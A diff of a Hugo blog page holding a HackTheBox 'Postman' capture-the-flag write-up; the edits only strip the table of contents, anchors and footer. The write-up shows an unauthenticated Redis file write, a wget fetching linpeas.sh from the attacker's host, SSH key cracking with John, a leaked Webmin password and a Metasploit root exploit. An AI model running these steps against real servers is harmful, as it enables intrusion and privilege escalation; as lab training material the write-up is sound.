@@ -47,10 +47,6 @@
 			</li>
 			
 			<li>
-				<a href="/categories">Categories</a>
-			</li>
-			
-			<li>
 				<a href="/tags">Tags</a>
 			</li>
 			
@@ -63,31 +59,9 @@
 			<h1 class="title">HackTheBox Postman Write Up</h1>
 			<div class="meta">Posted at &mdash; Mar 13, 2020</div>
 		</div>
-        
-            <div class="toc-container">
-                <div class="toc-post-title">Table Of Contents</div>
-                <nav id="TableOfContents">
-  <ul>
-    <li><a href="#reconnaissance">Reconnaissance</a></li>
-    <li><a href="#getting-user-account">Getting user account</a>
-      <ul>
-        <li><a href="#redis-file-write">Redis file write</a></li>
-        <li><a href="#cracking-ssh-key-with-john">Cracking ssh key with John</a></li>
-      </ul>
-    </li>
-    <li><a href="#getting-root">Getting root</a>
-      <ul>
-        <li><a href="#webmin-privilege-escalation">Webmin privilege escalation</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-            </div>
-        
 
 		<div class="markdown">
-            
-<h2 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h2>
+			<h2 id="reconnaissance">Reconnaissance</h2>
 <p>Let’s run a quick nmap scan as always.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># nmap -sV -sC -O -oA nmap/initial 10.10.10.160</span>
 </code></pre></div><p>Short explanation:</p>
@@ -109,8 +83,8 @@
 </code></pre></div><p><img src="/htb/postman/gobuster.png" alt="gobuster"></p>
 <p>Now I felt kinda lost so I looked into what did the full nmap scan find.</p>
 <p><img src="/htb/postman/nmap_full.png" alt="nmap full"></p>
-<h2 id="getting-user-account">Getting user account<a class="anchor" href="#getting-user-account">#</a></h2>
-<h3 id="redis-file-write">Redis file write<a class="anchor" href="#redis-file-write">#</a></h3>
+<h2 id="getting-user-account">Getting user account</h2>
+<h3 id="redis-file-write">Redis file write</h3>
 <p>So we have something called Redis here running. I tried to find some explanation to what is it and how to exploit it, Google found this.</p>
 <blockquote>
 <p>The Redis security model is: “it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself”.</p>
@@ -136,7 +110,7 @@ $ cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget &lt;your ip here&gt;:1114/linpeas.sh
 </code></pre></div><p>Now I ran the script and spent some time looking at the output. This took some time but there is a <code>id_rsa.bak</code> file.</p>
 <p><img src="/htb/postman/id_rsa_bak.png" alt="id rsa bak"></p>
-<h3 id="cracking-ssh-key-with-john">Cracking ssh key with John<a class="anchor" href="#cracking-ssh-key-with-john">#</a></h3>
+<h3 id="cracking-ssh-key-with-john">Cracking ssh key with John</h3>
 <p>Simply pipe this into ssh2john.py and crack it with the rockyou.txt wordlist.</p>
 <p><img src="/htb/postman/john.png" alt="john"></p>
 <p>I tried to ssh into the server with this key but no success. So I connected again as redis and ran</p>
@@ -144,15 +118,14 @@ $ cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
 </code></pre></div><p>And that’s how I got user</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Matt@Postman:~$ cat user.txt 
 517ad...
-</code></pre></div><h2 id="getting-root">Getting root<a class="anchor" href="#getting-root">#</a></h2>
+</code></pre></div><h2 id="getting-root">Getting root</h2>
 <p>Getting root is pretty easy, I just logged into webmin with <code>Matt</code> and <code>computer2008</code>. In there I couldn’t do anything, but we can see a notification that we have to update the software.</p>
-<h3 id="webmin-privilege-escalation">Webmin privilege escalation<a class="anchor" href="#webmin-privilege-escalation">#</a></h3>
+<h3 id="webmin-privilege-escalation">Webmin privilege escalation</h3>
 <p>I found an exploit on Metasploit and used it. Below are highlighted the options which are changed. Make sure to switch the payload as the default one didn’t work. I always have success in using the python one.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> &gt; show payloads
  &gt; set payload &lt;payload here&gt;
 </code></pre></div><p><img src="/htb/postman/metasploit.png" alt="metasploit"></p>
 <p>After this you can simply type <code>exploit</code> and you should have a shell as root and you can <code>cat root.txt</code>.</p>
-
 
 		</div>
 
@@ -176,7 +149,7 @@ $ cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
 		</div>
 	<div class="footer wrapper">
 	<nav class="nav">
-		<div> © All rights reserved |  <a href="https://twitter.com/ajdintrejic">Ajdin Trejić</a></div>
+		<div> © All rights reserved |  <a href="https://github.com/vividvilla/ezhil">Ezhil theme</a> | Built with <a href="https://gohugo.io">Hugo</a></div>
 	</nav>
 </div>
 
